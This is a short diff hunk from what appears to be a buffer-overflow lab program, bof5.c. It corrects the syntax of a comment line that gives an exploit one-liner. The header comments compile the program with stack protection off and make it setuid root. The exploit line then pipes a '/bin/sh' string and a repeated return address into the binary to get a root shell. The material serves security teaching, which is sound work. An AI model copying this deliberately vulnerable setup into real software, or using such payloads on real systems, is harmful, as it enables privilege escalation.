@@ -8,7 +8,7 @@
 // COMPILE $ gcc -fno-stack-protector bof5.c -o bof5
 // SETUID  $ sudo chown root:root bof5
 //         $ sudo chmod 4755 bof5
-// EXPLOIT $ {python -c "print('/bin/sh\x00'+'\x78\x56\x34\x12'*34";cat} | ./bof5
+// EXPLOIT $ (python -c "print '/bin/sh\x00'+'\x78\x56\x34\x12'*34";cat) | ./bof5
 
 void vuln() {
     int innocent;
